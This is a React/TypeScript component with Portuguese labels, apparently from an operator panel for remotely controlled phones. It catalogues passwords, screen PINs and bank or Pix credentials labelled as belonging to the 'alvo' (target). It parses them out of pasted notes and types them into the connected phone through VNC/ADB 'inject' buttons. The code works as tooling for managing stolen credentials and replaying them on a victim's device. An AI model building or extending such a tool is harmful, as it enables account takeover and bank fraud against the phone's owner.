import React, { useState, useEffect } from 'react';
import { 
  FileText, Key, CreditCard, Plus, Trash2, Copy, Zap, 
  Eye, EyeOff, Sparkles, Search, ShieldCheck, X, Fingerprint
} from 'lucide-react';

export interface NoteItem {
  id: string;
  category: 'password' | 'pin' | 'bank' | 'note';
  service: string; // ex: "Instagram", "Banco ItaÃº", "PIN Tela"
  username?: string; // ex: "alvo@email.com"
  value: string; // ex: "senha123", "4589"
  notes?: string;
  createdAt: string;
}

interface StructuredNotesManagerProps {
  deviceId: string;
  deviceNotes: string;
  onNotesChange: (val: string) => void;
  sendCommand: (cmd: any) => void;
  showToast: (msg: string, type?: 'success' | 'info' | 'error' | 'warning' | any) => void;
}

export default function StructuredNotesManager({
  deviceId,
  deviceNotes,
  onNotesChange,
  sendCommand,
  showToast
}: StructuredNotesManagerProps) {
  const [activeTab, setActiveTab] = useState<'all' | 'password' | 'pin' | 'bank' | 'raw'>('all');
  const [items, setItems] = useState<NoteItem[]>([]);
  const [showAddModal, setShowAddModal] = useState(false);
  const [visiblePasswords, setVisiblePasswords] = useState<Record<string, boolean>>({});
  const [searchTerm, setSearchTerm] = useState('');

  // FormulÃ¡rio de criaÃ§Ã£o
  const [formCategory, setFormCategory] = useState<'password' | 'pin' | 'bank' | 'note'>('password');
  const [formService, setFormService] = useState('');
  const [formUsername, setFormUsername] = useState('');
  const [formValue, setFormValue] = useState('');
  const [formNotes, setFormNotes] = useState('');

  // Carrega itens estruturados do localStorage
  useEffect(() => {
    const key = `device_credentials_${deviceId || 'default'}`;
    const saved = localStorage.getItem(key);
    if (saved) {
      try {
        setItems(JSON.parse(saved));
      } catch (e) {
        setItems([]);
      }
    } else {
      setItems([]);
    }
  }, [deviceId]);

  // Salva itens estruturados
  const saveItems = (newItems: NoteItem[]) => {
    setItems(newItems);
    const key = `device_credentials_${deviceId || 'default'}`;
    localStorage.setItem(key, JSON.stringify(newItems));
  };

  // Alterna visibilidade da senha
  const togglePasswordVisibility = (id: string) => {
    setVisiblePasswords(prev => ({ ...prev, [id]: !prev[id] }));
  };

  // Adiciona novo item estruturado
  const handleAddItem = (e: React.FormEvent) => {
    e.preventDefault();
    if (!formService.trim() || !formValue.trim()) {
      showToast('Preencha o serviÃ§o/nome e a senha/valor.', 'warning');
      return;
    }

    const newItem: NoteItem = {
      id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
      category: formCategory,
      service: formService.trim(),
      username: formUsername.trim() || undefined,
      value: formValue.trim(),
      notes: formNotes.trim() || undefined,
      createdAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    const updated = [newItem, ...items];
    saveItems(updated);

    // TambÃ©m adiciona resumo nas notas em texto para sincronia
    const lineSummary = `[${newItem.category.toUpperCase()}] ${newItem.service}: ${newItem.username ? newItem.username + ' | ' : ''}${newItem.value}`;
    const newNotes = deviceNotes.trim() ? `${deviceNotes.trim()}\n${lineSummary}` : lineSummary;
    onNotesChange(newNotes);

    // Reseta form
    setFormService('');
    setFormUsername('');
    setFormValue('');
    setFormNotes('');
    setShowAddModal(false);

    showToast(`âœ… ${newItem.service} adicionado e separado com sucesso!`, 'success');
  };

  // Remove um item estruturado
  const handleDeleteItem = (id: string) => {
    const updated = items.filter(it => it.id !== id);
    saveItems(updated);
    showToast('Item removido.', 'info');
  };

  // Injeta valor no celular via VNC/ADB
  const handleInjectValue = (val: string, label: string) => {
    if (!val) return;
    sendCommand({ action: 'TYPE', text: val });
    showToast(`âš¡ Injetando "${label}" no celular...`, 'info');
  };

  // Copia valor para clipboard
  const handleCopyValue = (val: string, label: string) => {
    if (!val) return;
    navigator.clipboard.writeText(val);
    showToast(`ðŸ“‹ ${label} copiado!`, 'success');
  };

  // Extrator Inteligente: Analisa texto bruto das notas e separa em cards estruturados
  const handleAutoParseNotes = () => {
    if (!deviceNotes.trim()) {
      showToast('O bloco de notas em texto livre estÃ¡ vazio.', 'warning');
      return;
    }

    const lines = deviceNotes.split('\n').map(l => l.trim()).filter(Boolean);
    const newExtracted: NoteItem[] = [];

    lines.forEach(line => {
      // Tenta reconhecer padrÃµes como: "Instagram: usuario / senha", "PIN: 1234", "ItaÃº - Ag: 1234 Conta: 5678"
      const lower = line.toLowerCase();
      let cat: 'password' | 'pin' | 'bank' | 'note' = 'password';

      if (lower.includes('pin') || lower.includes('padrÃ£o') || lower.includes('desbloqueio') || /^\d{4,8}$/.test(line)) {
        cat = 'pin';
      } else if (lower.includes('banco') || lower.includes('itau') || lower.includes('bradesco') || lower.includes('nubank') || lower.includes('caixa') || lower.includes('pix') || lower.includes('cartao')) {
        cat = 'bank';
      } else if (lower.includes('nota') || lower.includes('obs')) {
        cat = 'note';
      }

      // SeparaÃ§Ã£o por separadores comuns: ":", "-", "|", "/"
      const parts = line.split(/[:|\-\/]/).map(p => p.trim()).filter(Boolean);

      if (parts.length >= 2) {
        const service = parts[0];
        const val = parts[parts.length - 1];
        const user = parts.length > 2 ? parts[1] : undefined;

        newExtracted.push({
          id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
          category: cat,
          service: service || 'Credencial',
          username: user,
          value: val,
          notes: line,
          createdAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        });
      } else {
        newExtracted.push({
          id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
          category: cat,
          service: line.length > 20 ? line.substr(0, 20) + '...' : line,
          value: line,
          createdAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        });
      }
    });

    if (newExtracted.length > 0) {
      const merged = [...newExtracted, ...items];
      saveItems(merged);
      showToast(`âœ¨ ${newExtracted.length} itens extraÃ­dos e separados automaticamente!`, 'success');
      setActiveTab('all');
    }
  };

  // Filtra itens
  const filteredItems = items.filter(it => {
    const matchesTab = activeTab === 'all' || it.category === activeTab;
    const matchesSearch = !searchTerm || 
      it.service.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (it.username && it.username.toLowerCase().includes(searchTerm.toLowerCase())) ||
      it.value.toLowerCase().includes(searchTerm.toLowerCase());
    return matchesTab && matchesSearch;
  });

  const categoryBadge = (cat: string) => {
    switch (cat) {
      case 'password':
        return <span className="bg-red-950/80 text-red-400 border border-red-500/40 text-[9px] font-mono px-1.5 py-0.5 rounded flex items-center gap-1"><Key className="w-2.5 h-2.5" /> Senha</span>;
      case 'pin':
        return <span className="bg-amber-950/80 text-amber-400 border border-amber-500/40 text-[9px] font-mono px-1.5 py-0.5 rounded flex items-center gap-1"><Fingerprint className="w-2.5 h-2.5" /> PIN</span>;
      case 'bank':
        return <span className="bg-rose-950/80 text-emerald-400 border border-emerald-500/40 text-[9px] font-mono px-1.5 py-0.5 rounded flex items-center gap-1"><CreditCard className="w-2.5 h-2.5" /> Banco</span>;
      default:
        return <span className="bg-slate-800 text-slate-300 border border-slate-700 text-[9px] font-mono px-1.5 py-0.5 rounded flex items-center gap-1"><FileText className="w-2.5 h-2.5" /> Nota</span>;
    }
  };

  return (
    <div className="space-y-2.5 font-mono pt-1 text-slate-100">
      {/* HEADER PRINCIPAL */}
      <div className="flex items-center justify-between border-b border-[#14233e] pb-2">
        <div className="flex items-center gap-2">
          <ShieldCheck className="w-4 h-4 text-emerald-400 animate-pulse" />
          <span className="text-[11px] font-black text-emerald-300 uppercase tracking-wider font-mono">
            Gerenciador de Senhas & Notas
          </span>
        </div>
        <div className="flex items-center gap-1.5">
          <button
            onClick={() => setShowAddModal(!showAddModal)}
            className="px-2.5 py-1 bg-gradient-to-r from-rose-600 to-rose-500 hover:brightness-110 text-white rounded-lg font-bold text-[10px] uppercase font-mono transition-all flex items-center gap-1 shadow-md cursor-pointer border border-emerald-400/30"
            title="Adicionar Senha, PIN ou Conta"
          >
            <Plus className="w-3 h-3" /> Nova Senha
          </button>
        </div>
      </div>

      {/* NAVEGAÃ‡ÃƒO DE ABAS / CATEGORIAS E BUSCA */}
      <div className="space-y-2">
        <div className="flex bg-[#030712] p-1 rounded-xl border border-red-500/20 overflow-x-auto custom-scrollbar">
          <button
            onClick={() => setActiveTab('all')}
            className={`px-2.5 py-1 text-[10px] font-mono font-bold rounded-lg transition-all flex items-center gap-1 shrink-0 ${
              activeTab === 'all'
                ? 'bg-red-500/20 text-pink-300 border border-red-400/50 shadow-[0_0_8px_rgba(0,240,255,0.2)]'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            ðŸ“‚ Todas ({items.length})
          </button>
          <button
            onClick={() => setActiveTab('password')}
            className={`px-2.5 py-1 text-[10px] font-mono font-bold rounded-lg transition-all flex items-center gap-1 shrink-0 ${
              activeTab === 'password'
                ? 'bg-red-500/20 text-pink-300 border border-red-400/50 shadow-[0_0_8px_rgba(0,240,255,0.2)]'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            ðŸ”‘ Senhas ({items.filter(i => i.category === 'password').length})
          </button>
          <button
            onClick={() => setActiveTab('pin')}
            className={`px-2.5 py-1 text-[10px] font-mono font-bold rounded-lg transition-all flex items-center gap-1 shrink-0 ${
              activeTab === 'pin'
                ? 'bg-amber-500/20 text-amber-300 border border-amber-400/40 shadow-[0_0_8px_rgba(245,158,11,0.2)]'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            ðŸ”¢ PINs ({items.filter(i => i.category === 'pin').length})
          </button>
          <button
            onClick={() => setActiveTab('bank')}
            className={`px-2.5 py-1 text-[10px] font-mono font-bold rounded-lg transition-all flex items-center gap-1 shrink-0 ${
              activeTab === 'bank'
                ? 'bg-rose-500/20 text-emerald-300 border border-emerald-400/40 shadow-[0_0_8px_rgba(16,185,129,0.2)]'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            ðŸ’³ Bancos ({items.filter(i => i.category === 'bank').length})
          </button>
          <button
            onClick={() => setActiveTab('raw')}
            className={`px-2.5 py-1 text-[10px] font-mono font-bold rounded-lg transition-all flex items-center gap-1 shrink-0 ${
              activeTab === 'raw'
                ? 'bg-slate-700/50 text-white border border-slate-500/40'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            ðŸ“ Bloco Livre
          </button>
        </div>

        {/* BARRA DE PESQUISA & BOTAO EXTRAIR AUTOMÃTICO */}
        {activeTab !== 'raw' && (
          <div className="flex items-center gap-2">
            <div className="relative flex-1">
              <Search className="absolute left-2.5 top-2 h-3.5 w-3.5 text-slate-500" />
              <input
                type="text"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder="Buscar senha, banco ou usuÃ¡rio..."
                className="w-full pl-8 pr-3 py-1.5 bg-[#030612] border border-red-500/20 rounded-xl text-xs text-white placeholder-slate-600 focus:outline-none focus:border-red-400 text-[11px] font-mono"
              />
            </div>
            {deviceNotes.trim() && (
              <button
                onClick={handleAutoParseNotes}
                className="px-2.5 py-1.5 bg-red-950/60 hover:bg-red-900/80 border border-red-500/40 text-pink-300 rounded-xl text-[10px] font-mono font-bold flex items-center gap-1 transition-all shrink-0 cursor-pointer"
                title="Detectar e separar automaticamente senhas coladas no bloco de notas"
              >
                <Sparkles className="w-3 h-3 text-red-400" /> Auto-Separar
              </button>
            )}
          </div>
        )}
      </div>

      {/* FORMULÃRIO MODAL DE ADICIONAR */}
      {showAddModal && (
        <form onSubmit={handleAddItem} className="bg-[#040816] border border-emerald-500/40 p-3 rounded-2xl space-y-2.5 shadow-[0_0_20px_rgba(16,185,129,0.15)] relative">
          <div className="flex items-center justify-between border-b border-emerald-500/20 pb-1.5">
            <span className="text-[11px] font-bold text-emerald-400 uppercase font-mono flex items-center gap-1">
              <Plus className="w-3.5 h-3.5" /> Adicionar Nova Credencial / Senha
            </span>
            <button type="button" onClick={() => setShowAddModal(false)} className="text-slate-400 hover:text-white">
              <X className="w-4 h-4" />
            </button>
          </div>

          <div className="grid grid-cols-2 gap-2">
            <div>
              <label className="block text-[9px] font-bold text-slate-400 uppercase mb-1 font-mono">Categoria</label>
              <select
                value={formCategory}
                onChange={(e) => setFormCategory(e.target.value as any)}
                className="w-full px-2.5 py-1.5 bg-[#02040a] border border-emerald-500/30 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-400 font-mono"
              >
                <option value="password">ðŸ”‘ Senha de App / Site</option>
                <option value="pin">ðŸ”¢ PIN / PadrÃ£o de Tela</option>
                <option value="bank">ðŸ’³ Conta BancÃ¡ria / Pix</option>
                <option value="note">ðŸ“ AnotaÃ§Ã£o EspecÃ­fica</option>
              </select>
            </div>

            <div>
              <label className="block text-[9px] font-bold text-slate-400 uppercase mb-1 font-mono">ServiÃ§o / Nome</label>
              <input
                type="text"
                value={formService}
                onChange={(e) => setFormService(e.target.value)}
                placeholder="ex: Instagram, ItaÃº, PIN Tela"
                className="w-full px-2.5 py-1.5 bg-[#02040a] border border-emerald-500/30 rounded-xl text-xs text-white placeholder-slate-600 focus:outline-none focus:border-emerald-400 font-mono"
                required
              />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-2">
            <div>
              <label className="block text-[9px] font-bold text-slate-400 uppercase mb-1 font-mono">UsuÃ¡rio / Email / CPF (opcional)</label>
              <input
                type="text"
                value={formUsername}
                onChange={(e) => setFormUsername(e.target.value)}
                placeholder="ex: usuario@gmail.com"
                className="w-full px-2.5 py-1.5 bg-[#02040a] border border-emerald-500/30 rounded-xl text-xs text-white placeholder-slate-600 focus:outline-none focus:border-emerald-400 font-mono"
              />
            </div>

            <div>
              <label className="block text-[9px] font-bold text-slate-400 uppercase mb-1 font-mono">Senha / PIN / CÃ³digo</label>
              <input
                type="text"
                value={formValue}
                onChange={(e) => setFormValue(e.target.value)}
                placeholder="ex: minhaSenha123 ou 1234"
                className="w-full px-2.5 py-1.5 bg-[#02040a] border border-emerald-500/30 rounded-xl text-xs text-amber-300 font-bold placeholder-slate-600 focus:outline-none focus:border-emerald-400 font-mono"
                required
              />
            </div>
          </div>

          <div className="flex justify-end gap-2 pt-1">
            <button
              type="button"
              onClick={() => setShowAddModal(false)}
              className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs font-mono font-bold"
            >
              Cancelar
            </button>
            <button
              type="submit"
              className="px-4 py-1.5 bg-gradient-to-r from-rose-600 to-rose-500 text-white rounded-xl text-xs font-mono font-bold uppercase shadow-md border border-emerald-400/30"
            >
              Salvar Credencial
            </button>
          </div>
        </form>
      )}

      {/* MODO BLOCO EM TEXTO LIVRE */}
      {activeTab === 'raw' ? (
        <div className="space-y-2 font-mono">
          <textarea
            value={deviceNotes}
            onChange={(e) => onNotesChange(e.target.value)}
            placeholder="Escreva senhas, PINs, contas bancÃ¡rias, dados do alvo ou anotaÃ§Ãµes rÃ¡pidas deste aparelho..."
            rows={10}
            className="w-full px-3 py-2.5 bg-[#050b16] border border-red-500/30 focus:border-red-400 rounded-xl text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-red-400/40 text-xs font-mono transition-all resize-none shadow-inner custom-scrollbar"
          />

          <div className="grid grid-cols-3 gap-2">
            <button
              onClick={() => {
                if (deviceNotes.trim()) {
                  sendCommand({ action: 'TYPE', text: deviceNotes });
                  showToast('Injetando anotaÃ§Ãµes no celular...', 'info');
                }
              }}
              disabled={!deviceNotes.trim()}
              className="py-2 px-1.5 bg-gradient-to-r from-rose-600 via-teal-600 to-red-600 hover:from-rose-500 hover:to-red-500 disabled:opacity-40 text-white rounded-xl font-bold uppercase text-[10px] font-mono transition-all flex items-center justify-center gap-1.5 shadow-md cursor-pointer"
            >
              <Zap className="w-3.5 h-3.5" /> Injetar
            </button>

            <button
              onClick={() => {
                if (deviceNotes.trim()) {
                  navigator.clipboard.writeText(deviceNotes);
                  showToast('Notas copiadas!', 'success');
                }
              }}
              disabled={!deviceNotes.trim()}
              className="py-2 px-1.5 bg-gradient-to-r from-red-600 via-red-600 to-pink-500 hover:from-red-500 hover:to-red-500 disabled:opacity-40 text-white rounded-xl font-bold uppercase text-[10px] font-mono transition-all flex items-center justify-center gap-1.5 shadow-md cursor-pointer"
            >
              <Copy className="w-3.5 h-3.5" /> Copiar
            </button>

            <button
              onClick={() => {
                if (window.confirm('Deseja limpar o bloco de notas?')) {
                  onNotesChange('');
                  showToast('Bloco de notas limpo!', 'info');
                }
              }}
              disabled={!deviceNotes.trim()}
              className="py-2 px-1.5 bg-rose-950/40 border border-rose-800/40 hover:bg-rose-900/60 disabled:opacity-40 text-rose-300 rounded-xl font-bold uppercase text-[10px] font-mono transition-all flex items-center justify-center gap-1.5 cursor-pointer"
            >
              <Trash2 className="w-3.5 h-3.5" /> Limpar
            </button>
          </div>
        </div>
      ) : (
        /* LISTA ESTRUTURADA DE CARDS DE SENHAS E PINs */
        <div className="space-y-2 max-h-[360px] overflow-y-auto pr-1 custom-scrollbar">
          {filteredItems.length === 0 ? (
            <div className="text-center py-8 bg-[#030612]/60 border border-dashed border-red-500/20 rounded-2xl space-y-2 p-4">
              <Key className="w-8 h-8 text-slate-600 mx-auto animate-bounce" />
              <p className="text-slate-400 text-xs font-mono">
                Nenhuma senha ou credencial cadastrada nesta categoria.
              </p>
              <div className="flex items-center justify-center gap-2 pt-1">
                <button
                  onClick={() => setShowAddModal(true)}
                  className="px-3 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded-xl text-[11px] font-bold font-mono uppercase transition-all shadow-md"
                >
                  âž• Criar Primeira Senha
                </button>
                {deviceNotes.trim() && (
                  <button
                    onClick={handleAutoParseNotes}
                    className="px-3 py-1.5 bg-red-950 border border-red-500/40 text-pink-300 hover:bg-red-900 text-[11px] font-bold font-mono uppercase transition-all"
                  >
                    âœ¨ Extrair das Notas
                  </button>
                )}
              </div>
            </div>
          ) : (
            filteredItems.map(item => {
              const isVisible = visiblePasswords[item.id];
              return (
                <div
                  key={item.id}
                  className="bg-[#040816]/90 border border-red-500/25 hover:border-red-400/60 p-2.5 rounded-xl space-y-1.5 transition-all shadow-md relative group"
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      {categoryBadge(item.category)}
                      <span className="text-xs font-bold text-white font-mono tracking-wide">
                        {item.service}
                      </span>
                    </div>

                    <div className="flex items-center gap-1">
                      <span className="text-[9px] text-slate-500 font-mono">
                        {item.createdAt}
                      </span>
                      <button
                        onClick={() => handleDeleteItem(item.id)}
                        className="text-slate-600 hover:text-rose-400 p-1 transition-colors rounded"
                        title="Excluir item"
                      >
                        <Trash2 className="w-3 h-3" />
                      </button>
                    </div>
                  </div>

                  {/* UsuÃ¡rio (se houver) */}
                  {item.username && (
                    <div className="flex items-center justify-between bg-black/40 px-2.5 py-1 rounded-lg border border-slate-800">
                      <span className="text-[10px] text-slate-400 font-mono">UsuÃ¡rio / ID:</span>
                      <div className="flex items-center gap-1.5">
                        <span className="text-xs text-slate-200 font-mono font-semibold select-all">
                          {item.username}
                        </span>
                        <button
                          onClick={() => handleCopyValue(item.username!, 'UsuÃ¡rio')}
                          className="text-slate-500 hover:text-red-400 transition-colors"
                          title="Copiar usuÃ¡rio"
                        >
                          <Copy className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Senha / Valor */}
                  <div className="flex items-center justify-between bg-[#02050f] px-2.5 py-1.5 rounded-lg border border-red-500/20">
                    <span className="text-[10px] text-slate-400 font-mono">Senha / CÃ³digo:</span>
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-bold text-amber-300 font-mono select-all tracking-wider">
                        {isVisible ? item.value : 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢'}
                      </span>
                      
                      <button
                        onClick={() => togglePasswordVisibility(item.id)}
                        className="text-slate-500 hover:text-red-400 transition-colors p-0.5"
                        title={isVisible ? "Ocultar senha" : "Mostrar senha"}
                      >
                        {isVisible ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                      </button>

                      <button
                        onClick={() => handleCopyValue(item.value, 'Senha')}
                        className="text-slate-500 hover:text-red-400 transition-colors p-0.5"
                        title="Copiar Senha"
                      >
                        <Copy className="w-3.5 h-3.5" />
                      </button>

                      <button
                        onClick={() => handleInjectValue(item.value, item.service)}
                        className="px-2 py-0.5 bg-gradient-to-r from-rose-600 to-rose-500 hover:brightness-110 text-white text-[9px] font-mono font-bold uppercase rounded flex items-center gap-0.5 shadow transition-all cursor-pointer"
                        title="Injetar/Digitar esta senha direto no celular conectado!"
                      >
                        <Zap className="w-3 h-3" /> Injetar
                      </button>
                    </div>
                  </div>
                </div>
              );
            })
          )}
        </div>
      )}
    </div>
  );
}


